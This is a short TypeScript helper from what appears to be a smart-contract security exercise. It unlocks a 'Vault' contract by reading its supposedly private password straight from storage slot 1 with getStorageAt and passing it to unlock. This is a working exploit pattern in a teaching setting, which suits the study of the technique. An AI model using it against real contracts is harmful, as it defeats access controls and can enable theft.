import { expect } from "chai";
import { ethers, waffle } from "hardhat";

const helper = async (victim: any) => {
  /*
    Add code here that will help you pass the test
    Note: Unlock without using the string "A very strong password"
    Unlock the vault by somehow reading the private password from
    Vault directly
  */
  const provider = waffle.provider;
  const storageValue = await provider.getStorageAt(victim.address, 1);
  await victim.unlock(storageValue);
  const isLocked = await victim.locked();
  return isLocked;
};

export default helper;
